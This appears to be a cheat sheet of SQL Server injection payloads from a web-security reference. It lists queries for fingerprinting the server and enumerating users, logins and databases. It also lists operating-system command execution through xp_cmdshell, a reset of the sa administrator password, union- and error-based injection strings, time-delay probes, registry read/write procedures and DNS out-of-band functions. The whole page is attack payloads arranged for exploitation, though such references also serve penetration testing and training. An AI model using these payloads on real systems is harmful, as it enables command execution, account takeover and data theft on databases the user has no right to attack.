SQL Server Payload
========================================

Common Payloads
----------------------------------------
- Version
- ``SELECT @@version``
- ``SELECT SERVERPROPERTY('Edition');``
- ``SELECT SERVERPROPERTY('EngineEdition');``
- Comment
- ``SELECT 1 -- comment``
- ``SELECT /*comment*/1``
- Space
- ``0x01 - 0x20``
- User Information
- ``SELECT user_name()``
- ``SELECT system_user``
- ``SELECT user``
- ``SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID``
- User permissions
- ``select IS_SRVROLEMEMBER('sysadmin')``
- ``select IS_SRVROLEMEMBER('db_owner')``
- List User
- ``SELECT name FROM master..syslogins``
- Database Information
- ``SELECT name FROM master..sysdatabases``
- ``select concat_ws(table_schema,table_name,column_name) from information_schema.columns``
- ``select quotename(name) from master..sysdatabases FOR XML PATH('')``
- Execute the command
- ``EXEC xp_cmdshell 'net user'``
- Ascii
- ``SELECT char(0x41)``
- ``SELECT ascii('A')``
- ``SELECT char(65)+char(66)`` => return ``AB``
- Delay
- ``WAITFOR DELAY '0:0:3'`` pause for 3 seconds
- Change Password
- ``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``
- Trick
- ``id=1 union:select password from:user``
- File reading
- OpenRowset
- Current query statement
- ``select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)``
- hostname
- Used to determine whether the station library is separated
- ``select host_name()``
- ``exec xp_getnetname``
- Server Information
- ``exec xp_msver``
- System Configuration
- ``select * from sys.configurations;``

Registry Reading and Write
----------------------------------------
- ``xp_regread``
- ``exec xp_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSEARCH'``
- ``xp_regwrite``
- ``xp_regdeletvalue``
- ``xp_regdeletkey``
- ``xp_regaddmultistring``

Report an error injection
----------------------------------------
- ``1=convert(int,(db_name()))``

Common functions
----------------------------------------
- SUSER_NAME()
- USER_NAME()
- PERMISSIONS()
- DB_NAME()
- FILE_NAME()
- TYPE_NAME()
- COL_NAME()

DNS OOB
----------------------------------------
- fn_xe_file_target_read_file
- fn_get_audit_file
- fn_trace_gettable

Other commonly used stored procedures
----------------------------------------
- sp_execute_external_script
- SP_MAKEWEBTask
- sp_OACreate
- sp_OADestroy
- sp_OAGetErrorInfo
- sp_OAGetProperty
- sp_OAMethod
- sp_OASetProperty
- sp_OAStop
- xp_cmdshell
- xp_dirtree
- xp_enumerrorlogs
- xp_enumgroups
- xp_fixeddrives
- xp_getfiledetails
- xp_loginconfig
